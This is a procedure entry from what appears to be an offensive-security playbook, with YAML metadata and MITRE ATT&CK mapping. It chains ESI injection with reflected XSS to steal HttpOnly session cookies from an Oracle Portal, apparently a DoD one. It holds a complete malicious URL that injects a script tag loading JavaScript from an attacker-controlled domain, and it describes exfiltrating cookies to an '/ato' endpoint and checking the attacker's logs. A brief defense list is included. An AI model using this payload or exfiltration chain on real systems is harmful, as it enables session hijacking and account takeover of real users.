---
id: proc-chain-esi-xss-cookie-theft
name: Chain ESI Injection with XSS to Steal Session Cookies
tags:
  - esi-injection
  - xss
  - cookie-theft
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/Fetch-ESI-URL-and-Exfiltrate-Cookies-via-XSS]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T00:11:09.375Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Chain ESI Injection with XSS to Steal Session Cookies

## Summary

This procedure chains the ESI injection vulnerability with reflected XSS by loading an external JavaScript script via the XSS payload, which fetches the ESI-leaking endpoint, parses the response to extract cookies, and exfiltrates them to an attacker server, achieving session hijacking on the Oracle Portal.

## Description

Building on prior steps, the XSS in the show_tree 'title' parameter injects `<script src='https://www.jr0ch17.com/hta3.js'></script>`, where the script uses fetch to request the ESI URL, employs DOMParser to extract cookies from the rendered input (id='x61_ms'), and sends them via GET to the attacker's endpoint. This automates theft of HttpOnly cookies in a DoD portal context, leading to account takeover. Victim must visit the malicious URL.

## Requirements

1. Valid ESI injection URL from Step 1
2. Attacker-controlled server for exfiltration (e.g., https://www.jr0ch17.com/ato)
3. External JS host for the chaining script
4. Browser session on the target portal

## Defense

Defensive measures and detection strategies:

- Block external script loads with strict CSP (e.g., script-src 'self')
- Sanitize ESI and XSS inputs as per prior procedures
- Monitor for cross-origin fetches from portal domains and anomalous outbound requests to unknown hosts
- Use session binding to IP/user-agent and short expiration times

## Objectives

1. Automate cookie extraction via JS chaining
2. Exfiltrate session data silently
3. Enable attacker to impersonate the victim

## Instructions

### Step 1: Prepare External Chaining Script

**Context**: Host a JS file that performs the fetch and exfil (e.g., hta3.js at attacker domain).

The script content includes [[commands/Fetch-ESI-URL-and-Exfiltrate-Cookies-via-XSS]] executed on load.

> Ensure the script targets the exact ESI URL and element id.

### Step 2: Inject XSS Payload with Script Load

**Context**: Deliver the chain via the show_tree URL, loading the external script.

Visit:

```url
https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script src='https://www.jr0ch17.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup
```

> Payload loads and executes the script. Expected output: Silent fetch to ESI, parse, and exfil request in network tab.

### Step 3: Verify Exfiltration

**Context**: Check attacker server logs for received cookies.

Monitor the /ato endpoint for query params with cookies.

> Success: Full session cookies (e.g., JSESSIONID) arrive, allowing takeover.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

-

## Commands Used

- [[commands/Fetch-ESI-URL-and-Exfiltrate-Cookies-via-XSS]]

## Tools Used

-

## Tags

- [[chain-exploitation]]
- [[session-hijacking]]
